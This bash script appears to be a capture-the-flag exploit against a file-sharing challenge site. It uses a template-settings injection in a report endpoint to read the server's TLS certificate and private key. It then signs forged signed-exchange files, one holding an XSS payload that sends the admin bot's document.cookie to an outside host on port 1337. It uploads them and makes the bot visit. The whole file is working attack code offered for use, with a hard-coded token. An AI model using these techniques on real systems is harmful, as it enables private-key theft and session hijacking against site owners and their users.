#!/bin/bash

BASE_URL='https://sharer.world'

# upload function
function upload() {
  curl -s $BASE_URL/upload -F "file=@$1;type=$2" | grep -e 'preview' | cut -d'/' -f3
}


curl -s https://sharer.world/report --data 'settings[view%20engine]=pem&settings[views]=/opt/certificates/&settings[layout]=fullchain' -o cert.pem
curl -s https://sharer.world/report --data 'settings[view%20engine]=pem&settings[views]=/opt/certificates/&settings[layout]=privkey' -o priv.key

~/go/bin/gen-certurl -pem cert.pem > cert.cbor

token="7363db1f-5c08-4709-8fe1-db2d47efec93"

echo "<script>location='http://sq.pe:1337/?'+document.cookie</script>" > xss.html

# https://github.com/WICG/webpackage/blob/main/go/signedexchange/README.md
~/go/bin/gen-signedexchange \
  -uri "https://admin-bot.sharer.world/flag" \
  -content xss.html \
  -certificate cert.pem \
  -privateKey priv.key \
  -certUrl "data:application/cert-chain+cbor;base64,$(base64 -i cert.cbor)" \
  -validityUrl "https://admin-bot.sharer.world/resource.validity.msg" \
  -o xss.html.sxg

file_id="$(upload 'xss.html.sxg' 'application/signed-exchange;v=b3')"
echo "XSS file_id: $file_id"


touch empty.html
~/go/bin/gen-signedexchange \
  -uri "https://example.com/" \
  -content empty.html \
  -certificate cert.pem \
  -privateKey priv.key \
  -certUrl "https://admin-bot.sharer.world/visit?path=/file/$file_id&token=$token" \
  -validityUrl "https://example.com/resource.validity.msg" \
  -o cert-request.html.sxg

file_id="$(upload 'cert-request.html.sxg' 'application/signed-exchange;v=b3')"
echo "Req file_id: $file_id"
curl "$BASE_URL/report" --data "file_id=$file_id&token=$token"

